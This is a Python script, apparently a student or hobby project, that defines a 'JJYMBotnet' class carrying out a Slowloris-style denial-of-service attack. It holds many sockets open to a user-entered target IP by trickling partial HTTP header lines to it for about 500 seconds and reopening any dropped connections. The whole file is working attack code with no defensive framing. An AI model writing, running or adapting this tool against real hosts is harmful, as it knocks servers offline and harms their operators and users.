import time
import random
import socket

class JJYMBotnet():
    def __init__(self, ip, port, num_of_sockets = 50):
        self.HTTP_headers = [
            "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'",
            "Accept-Language: en-us,en,fr,sp;q=0.5"
        ]
        self._ipAddress = ip
        self._port = port
        self._sockets = [self.newSocket() for _ in range(num_of_sockets)]
        self._myIP = "130.65.254.6";
        self._myHostName = socket.gethostname();
        # self._myIP = socket.gethostbyname(self._myHostName);


    def spam_requests(self, speed):
        t, i = time.time(), 0
        while (time.time() - t < 500):
            for s in self._sockets:
                try:
                    print("HOSTNAME: " + self._myHostName)
                    print("Bot @IP "+ self._myIP +": Sent request #" + str(i))
                    print("Targetting IP: " + self._ipAddress);
                    print("-------------------")
                    s.send(self.get_callback_message("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(speed)

    def get_callback_message(self, callbackMessage):
        return (callbackMessage + "{} HTTP/2.0\r\n".format(str(random.randint(0, 999)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self._ipAddress, self._port))
            s.send(self.get_callback_message("Get /?"))
            for header in self.HTTP_headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as sockerr:
            print("Received a socket error: " + str(sockerr))
            return self.newSocket()




if __name__ == "__main__":
    inIP = input("Enter an IP Address for the bot to attack: ")
    speed = input("Enter delay between requests: ")
    dos = JJYMBotnet(inIP, 135, 200)
    dos.spam_requests(float(speed))

    # "192.168.56.1" = mine
    # 130.65.254.9 = my phone
